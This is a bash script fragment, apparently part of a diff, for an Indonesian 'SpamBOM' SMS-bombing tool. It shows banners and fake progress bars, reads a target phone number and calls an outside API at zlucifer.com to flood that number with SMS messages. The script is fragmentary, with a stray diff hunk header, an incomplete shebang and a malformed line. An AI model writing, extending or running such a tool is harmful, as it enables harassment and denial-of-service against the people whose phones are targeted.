#!/usr/bin/env 
bom(){
toilet -f standard "SpamBOM" -F gay
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
clear 
load
clear
bom
toilet -f standard "SpamBOM" -F gay
clear
load
clear
bom
"selamat datang" | lolcat
get_url=$(curl -s http://zlucifer.com/api/sms.php)
cek='curl -s '$get_url # check status
@@ -61,28 +83,19 @@ else
    read confirm
    echo
    if [ $confirm = "y" ]; then
    	load
        clear
        echo Melakukan spam SMS ke nomor $target
        i=0
        max=1000
        while [ $i -le $max ]; do
        echo -ne "\nSpamming percentage : $i% "
        sleep 0.03
        if [ $i -eq 100 ]; then
            echo -ne " [complete!]\n"
            echo "+++++++++++++++++++++++++++++++++++++++"
            echo "Tunggu Sampai Selesai Pemuatan :)"            
            echo "+++++++++++++++++++++++++++++++++++++++"
            target_do=$get_url'/sms.php?nomor='$target'&paket='$paket


            CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
            fi
            let i++
            done
    else
        echo "Kesalahan"
    fi